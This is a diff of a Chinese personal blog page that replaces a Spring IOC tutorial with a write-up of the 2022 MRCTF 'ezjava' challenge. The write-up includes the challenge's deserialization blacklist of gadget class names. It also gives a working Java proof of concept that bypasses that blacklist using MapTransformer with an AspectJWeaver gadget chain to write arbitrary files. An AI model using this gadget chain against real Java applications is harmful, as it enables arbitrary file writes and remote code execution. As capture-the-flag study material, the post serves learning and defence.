@@ -4,7 +4,7 @@
   <!-- 元数据 -->
   <meta charset="utf-8">
   <link rel="icon" href="images/favicon.ico">
-  <title>Spring IOC学习 | fmyyy</title>
+  <title>2022MRCTF-ezjava的一点小研究 | fmyyy</title>
   <meta name="author" content="fmyyy" />
   <meta http-equiv="Cache-Control" content="no-transform" />
   <meta http-equiv="Cache-Control" content="no-siteapp" />
@@ -15,16 +15,16 @@
   
     <meta name="keywords" content="" />
   
-  <meta name="description" content="Spring IOC学习Spring IOC这里需要注意的是，IOC和Spring IOC不能混为一谈，IOC是一种概念和设计思路，Spring实现了IOC的思想，是IOC的实践。 我们通常提到的Spring IOC，实际上是指Spring框架提供的IOC容器实现（IOC Container） IOC叫做控制反转，另一种说法是依赖注入。 IOC的作用简单来说，就是控制对象的创建和销毁。控制和销毁本">
+  <meta name="description" content="前言写这篇文章起因是mrctf，比赛那两天因为个人原因在摆烂没有看题。今天晚上去简单看了一下ezjava，spring还没有仔细去研究。 一看到题目我就有了自己的一个思路，因为设有过滤，如下 1234567891011121314151617181920212223242526272829&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&amp;q">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Spring IOC学习">
-<meta property="og:url" content="https://fmyyy.gitee.io/2022/03/07/Spring-IOC/index.html">
+<meta property="og:title" content="2022MRCTF-ezjava的一点小研究">
+<meta property="og:url" content="https://fmyyy.gitee.io/2022/04/25/2022MRCTF-ezjava%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E7%A0%94%E7%A9%B6/index.html">
 <meta property="og:site_name" content="fmyyy">
-<meta property="og:description" content="Spring IOC学习Spring IOC这里需要注意的是，IOC和Spring IOC不能混为一谈，IOC是一种概念和设计思路，Spring实现了IOC的思想，是IOC的实践。 我们通常提到的Spring IOC，实际上是指Spring框架提供的IOC容器实现（IOC Container） IOC叫做控制反转，另一种说法是依赖注入。 IOC的作用简单来说，就是控制对象的创建和销毁。控制和销毁本">
+<meta property="og:description" content="前言写这篇文章起因是mrctf，比赛那两天因为个人原因在摆烂没有看题。今天晚上去简单看了一下ezjava，spring还没有仔细去研究。 一看到题目我就有了自己的一个思路，因为设有过滤，如下 1234567891011121314151617181920212223242526272829&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&amp;q">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://fmyyy.gitee.io/images/favicon.ico">
-<meta property="article:published_time" content="2022-03-07T11:14:04.000Z">
-<meta property="article:modified_time" content="2022-03-08T05:44:42.000Z">
+<meta property="article:published_time" content="2022-04-25T15:14:04.000Z">
+<meta property="article:modified_time" content="2022-04-25T16:01:51.079Z">
 <meta property="article:author" content="fmyyy">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://fmyyy.gitee.io/images/favicon.ico">
@@ -171,17 +171,17 @@
     <div class="kratos-hentry kratos-post-inner clearfix">
         <header class="kratos-entry-header">
             
-                <h1 class="kratos-entry-title text-center">Spring IOC学习</h1>
+                <h1 class="kratos-entry-title text-center">2022MRCTF-ezjava的一点小研究</h1>
             
             
             <ul class="kratos-post-meta text-center">
-                <li><i class="fa fa-calendar"></i> 2022-03-07</li>
+                <li><i class="fa fa-calendar"></i> 2022-04-25</li>
                 <li><i class="fa fa-user"></i> 作者 fmyyy</li>
                 <li>
                     <i class="fa fa-edit"></i> 
                     
                     
-                        ~4.39K
+                        ~3.74K
                     
                     字
                 </li>
@@ -190,56 +190,37 @@
         </header>
         <div class="kratos-post-content">
             <div id="expire-alert" class="alert alert-warning hidden" role="alert">
-                本文最后编辑于 <time datetime="1646718282000"></time> 前，其中的内容可能需要更新。
+                本文最后编辑于 <time datetime="1650902511079"></time> 前，其中的内容可能需要更新。
             </div>
             
                 <div class="kratos-post-inner-toc">
-                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-IOC%E5%AD%A6%E4%B9%A0"><span class="toc-number">1.</span> <span class="toc-text">Spring IOC学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-IOC"><span class="toc-number">1.1.</span> <span class="toc-text">Spring IOC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-IOC%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.</span> <span class="toc-text">Spring IOC加载流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-number">1.2.1.</span> <span class="toc-text">流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FactoryBean%E5%92%8CBeanFactory%E5%8C%BA%E5%88%AB"><span class="toc-number">1.2.2.</span> <span class="toc-text">FactoryBean和BeanFactory区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%86FactoryBean%E5%92%8C%E6%99%AE%E9%80%9ABean"><span class="toc-number">1.2.3.</span> <span class="toc-text">区分FactoryBean和普通Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ApplicationContext"><span class="toc-number">1.2.4.</span> <span class="toc-text">ApplicationContext</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-number">1.3.</span> <span class="toc-text">bean的生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">1.4.</span> <span class="toc-text">总结</span></a></li></ol></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%9B%BF%E4%BB%A3%E5%93%81"><span class="toc-number">2.</span> <span class="toc-text">寻找替代品</span></a></li></ol>
                 </div>
             
             <hr />
-            <h1 id="Spring-IOC学习"><a href="#Spring-IOC学习" class="headerlink" title="Spring IOC学习"></a>Spring IOC学习</h1><h2 id="Spring-IOC"><a href="#Spring-IOC" class="headerlink" title="Spring IOC"></a>Spring IOC</h2><p>这里需要注意的是，IOC和Spring IOC不能混为一谈，IOC是一种概念和设计思路，Spring实现了IOC的思想，是IOC的实践。</p>
-<p>我们通常提到的Spring IOC，实际上是指Spring框架提供的IOC容器实现（IOC Container）</p>
-<p>IOC叫做控制反转，另一种说法是依赖注入。</p>
-<p>IOC的作用简单来说，就是控制对象的创建和销毁。控制和销毁本来是由用户控制的，用了IOC之后用户只需要去关注业务需求。</p>
-<p>反转的概念：</p>
-<p>正转指的是对象去找实例(Object o = new Object();)，反转就是实例去找对象，通过容器去找对象。</p>
-<p>依赖：</p>
-<p>在spring项目中，将对象理解为Bean，也可以叫bean对象，这个bean和容器之间有个依赖关系，bean对象的创建是依赖容器的，就好像孩子依赖父母一样，孩子不能自己生出自己，需要父母的合作才能出生，这里的孩子就是bean，父母就是容器</p>
-<p>注入：</p>
-<p>通过容器注入了bean对象，而且这个过程是自动化的，也就是说容器会自动找到和bean对象匹配的类型实例注入到对象中；</p>
-<h2 id="Spring-IOC加载流程"><a href="#Spring-IOC加载流程" class="headerlink" title="Spring IOC加载流程"></a>Spring IOC加载流程</h2><h3 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h3><p><img src="https://img.le1a.com/2022/03/07/4211567188719.png" alt="1646646389223.png"></p>
-<p>1、先是通过BeanDefinitionReader读取配置文件，生成bean的信息。BeanDefinition对象是完整的bean定义信息。这里只是存储bean的定义信息还没有实例化bean对象。</p>
-<p>2、在 <code>BeanDefinition</code> 和 完整<code>BeanDefinition</code> 中间通过一个后置增强器，可以对bean的定义信息进行统一修改，只需要实现 <code>BeanFactoryPostProcessor</code> 接口即可，这个后置增强器是可以有多个的，你只要在不同的类实现多个 <code>BeanFactoryPostProcessor</code> 接口就会执行多次，就像这样：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.Spring.Boot.init;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.BeansException;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.config.BeanFactoryPostProcessor;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.config.ConfigurableListableBeanFactory;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 扩展方法--后置增强器（可修改bean的定义信息）</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@Component</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ExtBeanFactoryPostProcessor</span> <span class="keyword">implements</span> <span class="title">BeanFactoryPostProcessor</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">postProcessBeanFactory</span><span class="params">(ConfigurableListableBeanFactory beanFactory)</span> <span class="keyword">throws</span> BeansException </span>&#123;</span><br><span class="line"><span class="comment">//        BeanDefinition studentService = beanFactory.getBeanDefinition(&quot;studentService&quot;);</span></span><br><span class="line">        System.out.println(<span class="string">&quot;扩展方法--可进行修改beanDefinition的定义信息&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>3、得到完整<code>BeanDefinition</code>之后就可以进行创建对象了，这整个过程被称为 bean 的生命周期，也就是从实例化到销毁的过程；</p>
-<h3 id="FactoryBean和BeanFactory区别"><a href="#FactoryBean和BeanFactory区别" class="headerlink" title="FactoryBean和BeanFactory区别"></a>FactoryBean和BeanFactory区别</h3><p>BeanFactory直译是生产Bean的工厂，在Spring中就是容器，常用的ApplicationContext就是它的一个继承类.而FactoryBean顾名思义就是一个bean，但这个bean和普通bean有点不一样。</p>
-<h3 id="区分FactoryBean和普通Bean"><a href="#区分FactoryBean和普通Bean" class="headerlink" title="区分FactoryBean和普通Bean"></a>区分FactoryBean和普通Bean</h3><p>​    Spring中有两种类型的Bean，一种是普通Bean，另一种是工厂Bean即FactoryBean，这两种Bean都被容器管理。工厂Bean是实现了org.springframework.beans.factory.FactoryBean<T>接口的Bean,从ApplicationContext的getBean()方法获取的对象不是该类的一个实例，而是该类的getObject()方法所返回的对象。</p>
-<p> 当我们需要获取FactoryBean实例本身而不是它所产生的bean，则要使用&amp;符号。</p>
-<p> 比如，现有FactoryBean，id为“playerBean”，在容器上调用getBean(“playerBean”)将返回FactoryBean产生的bean。调用getBean(“&amp;playerBean”)将返回FactoryBean它本身的实例。</p>
-<h3 id="ApplicationContext"><a href="#ApplicationContext" class="headerlink" title="ApplicationContext"></a>ApplicationContext</h3><p><img src="https://img.le1a.com/2022/03/07/3be2b2028531e.png" alt="1646654275291.png"></p>
-<p>接口 BeanFactory 和 ApplicationContext 都是用来从容器中获取 Spring beans 的，但是，他们二者有很大不同</p>
-<p>如果说BeanFactory是Spring的心脏，那么ApplicationContext就是完整的躯体了。</p>
-<p>ApplicationContext继承了BeanFactory（ListableBeanFactory, HierarchicalBeanFactory），所以它拥有更完善的功能，支持大型的业务。</p>
-<p>两者获取bean的区别，举例</p>
-<p>Beans.xml</p>
-<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version = &quot;1.0&quot; encoding = &quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span> = <span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xmlns:xsi</span> = <span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">xsi:schemaLocation</span> = <span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">   http://www.springframework.org/schema/beans/spring-beans-3.0.xsd&quot;</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span> = <span class="string">&quot;helloWorld&quot;</span> <span class="attr">class</span> = <span class="string">&quot;com.zoltanraffai.HelloWorld&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span> = <span class="string">&quot;message&quot;</span> <span class="attr">value</span> = <span class="string">&quot;Hello World!&quot;</span>/&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-<p>BeanFactory 和 ApplicationContext怎么获取他？</p>
-<p>BeanFactory：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">import</span> org.springframework.core.io.ClassPathResource;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean; </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.XmlBeanFactory; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldApp</span></span>&#123; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">      XmlBeanFactory factory = <span class="keyword">new</span> XmlBeanFactory (<span class="keyword">new</span> ClassPathResource(<span class="string">&quot;beans.xml&quot;</span>)); </span><br><span class="line">      HelloWorld obj = (HelloWorld) factory.getBean(<span class="string">&quot;helloWorld&quot;</span>);    </span><br><span class="line">      obj.getMessage();    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>ApplicationContext：</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.springframework.core.io.ClassPathResource;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.InitializingBean; </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.xml.XmlBeanFactory; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldApp</span></span>&#123; </span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123; </span><br><span class="line">      ApplicationContext context=<span class="keyword">new</span> ClassPathXmlApplicationContext(<span class="string">&quot;beans.xml&quot;</span>); </span><br><span class="line">      HelloWorld obj = (HelloWorld) context.getBean(<span class="string">&quot;helloWorld&quot;</span>);    </span><br><span class="line">      obj.getMessage();    </span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+            <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>写这篇文章起因是mrctf，比赛那两天因为个人原因在摆烂没有看题。今天晚上去简单看了一下ezjava，spring还没有仔细去研究。</p>
+<p>一看到题目我就有了自己的一个思路，因为设有过滤，如下</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="line">&lt;!-- serialkiller.conf --&gt;</span><br><span class="line">&lt;config&gt;</span><br><span class="line">    &lt;refresh&gt;<span class="number">6000</span>&lt;/refresh&gt;</span><br><span class="line">    &lt;mode&gt;</span><br><span class="line">        &lt;!-- set to <span class="string">&#x27;false&#x27;</span> <span class="keyword">for</span> blocking mode --&gt;</span><br><span class="line">        &lt;profiling&gt;<span class="keyword">false</span>&lt;/profiling&gt;</span><br><span class="line">    &lt;/mode&gt;</span><br><span class="line">    &lt;logging&gt;</span><br><span class="line">        &lt;enabled&gt;<span class="keyword">false</span>&lt;/enabled&gt;</span><br><span class="line">    &lt;/logging&gt;</span><br><span class="line">    &lt;blacklist&gt;</span><br><span class="line">        &lt;!-- ysoserial<span class="string">&#x27;s CommonsCollections1,3,5,6 payload  --&gt;</span></span><br><span class="line"><span class="string">        &lt;regexp&gt;org\.apache\.commons\.collections\.Transformer$&lt;/regexp&gt;</span></span><br><span class="line"><span class="string">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InvokerTransformer$&lt;/regexp&gt;</span></span><br><span class="line"><span class="string">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ChainedTransformer$&lt;/regexp&gt;</span></span><br><span class="line"><span class="string">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.ConstantTransformer$&lt;/regexp&gt;</span></span><br><span class="line"><span class="string">        &lt;regexp&gt;org\.apache\.commons\.collections\.functors\.InstantiateTransformer$&lt;/regexp&gt;</span></span><br><span class="line"><span class="string">        &lt;!-- ysoserial&#x27;</span>s CommonsCollections2,<span class="number">4</span> payload  --&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InvokerTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ChainedTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.ConstantTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections4\.functors\.InstantiateTransformer$&lt;/regexp&gt;</span><br><span class="line">        &lt;regexp&gt;org\.apache\.commons\.collections4\.comparators\.TransformingComparator$&lt;/regexp&gt;</span><br><span class="line">    &lt;/blacklist&gt;</span><br><span class="line">    &lt;whitelist&gt;</span><br><span class="line">        &lt;regexp&gt;.*&lt;/regexp&gt;</span><br><span class="line">    &lt;/whitelist&gt;</span><br><span class="line">&lt;/config&gt;</span><br></pre></td></tr></table></figure>
 
 
 
-<p>看起来是差不多，但他们的加载方式是不同的。</p>
-<p>BeanFactroy采用的是延迟加载形式来注入Bean的，即只有在使用到某个Bean时(调用getBean())，才对该Bean进行加载实例化，这样，我们就不能发现一些存在的Spring的配置问题。而ApplicationContext则相反，它是在容器启动时，一次性创建了所有的Bean。这样，在容器启动时，我们就可以发现Spring中存在的配置错误。 相对于基本的BeanFactory，ApplicationContext 唯一的不足是占用内存空间。当应用程序配置Bean较多时，程序启动较慢。</p>
-<h2 id="bean的生命周期"><a href="#bean的生命周期" class="headerlink" title="bean的生命周期"></a>bean的生命周期</h2><p><img src="https://img.le1a.com/2022/03/07/11db0474e9f51.png" alt="1646654683754.png"></p>
-<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>简单的学一下，主要是看这位大神的文章，从源码的角度讲，写的特别详细</p>
-<p><a target="_blank" rel="noopener" href="https://javadoop.com/post/spring-ioc">https://javadoop.com/post/spring-ioc</a></p>
+<p>并且有AspectJWeaver 而且题目提醒jdk8u181又是springboot,不出网。想到三梦大师傅的一篇文章</p>
+<p><a target="_blank" rel="noopener" href="https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/">https://threedr3am.github.io/2021/04/14/JDK8%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%86%99%E5%9C%BA%E6%99%AF%E4%B8%8B%E7%9A%84SpringBoot%20RCE/</a></p>
+<p>想到利用AspectJWeaver写入任意文件再配合三梦师傅的trick进行rce，因为题目设有一个任意文件读取，所以想法是rce将flag写入/tmp文件夹下然后读取任意文件。</p>
+<p>但主要问题是AspectJWeaver反序列化在yso里是要用到ConstantTransformer但题目又给ban了，所以想找个替代品，花了点时间简单的研究了一下。</p>
+<h2 id="寻找替代品"><a href="#寻找替代品" class="headerlink" title="寻找替代品"></a>寻找替代品</h2><p>我找到的是MapTransformer</p>
+<p>先放一下poc吧</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Class clazz = Class.forName(<span class="string">&quot;org.aspectj.weaver.tools.cache.SimpleCache$StoreableCachingMap&quot;</span>);</span><br><span class="line">        Constructor declaredConstructor = clazz.getDeclaredConstructor(String.class,<span class="keyword">int</span>.class);</span><br><span class="line">        declaredConstructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        HashMap map = (HashMap)declaredConstructor.newInstance(<span class="string">&quot;/tmp/&quot;</span>, <span class="number">123</span>);</span><br><span class="line">        HashMap map2 = <span class="keyword">new</span> HashMap();</span><br><span class="line">        map2.put(<span class="string">&quot;2.txt&quot;</span>,<span class="string">&quot;fmyyy&quot;</span>.getBytes(StandardCharsets.UTF_8));</span><br><span class="line">        Class clazz1 = Class.forName(<span class="string">&quot;org.apache.commons.collections.functors.MapTransformer&quot;</span>);</span><br><span class="line">        Constructor constructor = clazz1.getDeclaredConstructor(Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        MapTransformer emapTransformer = (MapTransformer) constructor.newInstance(map2);</span><br><span class="line">        Map outerMap = LazyMap.decorate(map,emapTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(outerMap,<span class="string">&quot;2.txt&quot;</span>);</span><br><span class="line">        HashSet hashSet = <span class="keyword">new</span> LinkedHashSet(<span class="number">1</span>);</span><br><span class="line">        hashSet.add(tiedMapEntry);</span><br><span class="line">        outerMap.remove(<span class="string">&quot;2.txt&quot;</span>);</span><br><span class="line">        System.out.println(Base64.getEncoder().encodeToString(serialize(hashSet)));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+<p>其实跟原版就差在MapTransformer这里，原理也很简单。</p>
+<p>众所周知ConstantTransformer的transform方法是传什么返回什么，但MapTransformer是根据key来获取value，所以这里新建一个map，put一个key跟文件名相同就行</p>
+<p><img src="https://img.le1a.com/2022/04/25/5211efbcf63e2.png" alt="1650897796149.png"></p>
+<p>成功获取内容</p>
+<p><img src="https://img.le1a.com/2022/04/25/dde7900a38f5e.png" alt="1650897913449.png"></p>
+<p>之后拿mrctf的ezjava本地打了一下</p>
+<p><img src="https://img.le1a.com/2022/04/25/d09d627453cb0.png" alt="1650898020007.png"></p>
+<p><img src="https://img.le1a.com/2022/04/25/42386ee7ceb2d.png" alt="1650898072875.png"></p>
+<p>确实是绕过waf写进去了，感觉能替代的类还是很多的，之后我的思路是用三梦师傅的文章写class来rce，因为题目说是jdk8u181所以目录应该不难猜，不过看到大师傅们晚上发的wp直接bypass进行rce感觉自己还是菜。</p>
 
         </div>
         
@@ -293,7 +274,7 @@
     <script type="text/javascript">
         $(()=>{
             new QRCode("wechat-qr", {
-                text: "https://fmyyy.gitee.io/2022/03/07/Spring-IOC/",
+                text: "https://fmyyy.gitee.io/2022/04/25/2022MRCTF-ezjava%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E7%A0%94%E7%A9%B6/",
                 width: 150,
                 height: 150,
                 correctLevel : QRCode.CorrectLevel.H
@@ -305,10 +286,11 @@
             const qzoneBase     = "https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?";
             const facebookBase  = "https://www.facebook.com/sharer/sharer.php?";
             const twitterBase   = "https://twitter.com/intent/tweet?";
-            const hostUrl       = "https://fmyyy.gitee.io/2022/03/07/Spring-IOC/";
-            const title         = "「Spring IOC学习」";
-            const excerpt       = `Spring IOC学习Spring IOC这里需要注意的是，IOC和Spring IOC不能混为一谈，IOC是一种概念和设计思路，Spring实现了IOC的思想，是IOC的实践。
-我们通常提到的Spring IOC，实际上是指Spr...`;
+            const hostUrl       = "https://fmyyy.gitee.io/2022/04/25/2022MRCTF-ezjava%E7%9A%84%E4%B8%80%E7%82%B9%E5%B0%8F%E7%A0%94%E7%A9%B6/";
+            const title         = "「2022MRCTF-ezjava的一点小研究」";
+            const excerpt       = `前言写这篇文章起因是mrctf，比赛那两天因为个人原因在摆烂没有看题。今天晚上去简单看了一下ezjava，spring还没有仔细去研究。
+一看到题目我就有了自己的一个思路，因为设有过滤，如下
+123456789101112131415...`;
             let _URL;
             switch (dest) {
                 case "qq"       : _URL = qqBase+"url="+hostUrl+"&title="+title+"&desc=&summary="+excerpt+"&site=cxpy";     break;
@@ -330,7 +312,7 @@
                     
                 </div>
                 <div class="pull-date">
-                <span>最后编辑：2022-03-08</span>
+                <span>最后编辑：2022-04-26</span>
                 </div>
             </div>
         </footer>
@@ -339,13 +321,9 @@
         <nav class="navigation post-navigation clearfix" role="navigation">
             
             <div class="nav-previous clearfix">
-                <a title=" Tomcat几种回显" href="/2022/03/06/TomcatEcho/">&lt; 上一篇</a>
+                <a title=" 任意加载字节码下的回显" href="/2022/04/14/任意加载字节码下的回显/">&lt; 上一篇</a>
             </div>
             
-            
-            <div class="nav-next clearfix">
-                <a title=" D^3CTF web部分wp" href="/2022/03/08/d^3CTF web部分wp/">下一篇 &gt;</a>
-            </div>
             
         </nav>
     
@@ -387,7 +365,7 @@
         <span class="toc-progress-bar"></span>
     </h4>
     <div class="textwidget">
-        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Spring-IOC%E5%AD%A6%E4%B9%A0"><span class="toc-text">Spring IOC学习</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-IOC"><span class="toc-text">Spring IOC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Spring-IOC%E5%8A%A0%E8%BD%BD%E6%B5%81%E7%A8%8B"><span class="toc-text">Spring IOC加载流程</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%81%E7%A8%8B"><span class="toc-text">流程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#FactoryBean%E5%92%8CBeanFactory%E5%8C%BA%E5%88%AB"><span class="toc-text">FactoryBean和BeanFactory区别</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8C%BA%E5%88%86FactoryBean%E5%92%8C%E6%99%AE%E9%80%9ABean"><span class="toc-text">区分FactoryBean和普通Bean</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ApplicationContext"><span class="toc-text">ApplicationContext</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#bean%E7%9A%84%E7%94%9F%E5%91%BD%E5%91%A8%E6%9C%9F"><span class="toc-text">bean的生命周期</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-text">总结</span></a></li></ol></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AF%BB%E6%89%BE%E6%9B%BF%E4%BB%A3%E5%93%81"><span class="toc-text">寻找替代品</span></a></li></ol>
     </div>
 </aside>
                 
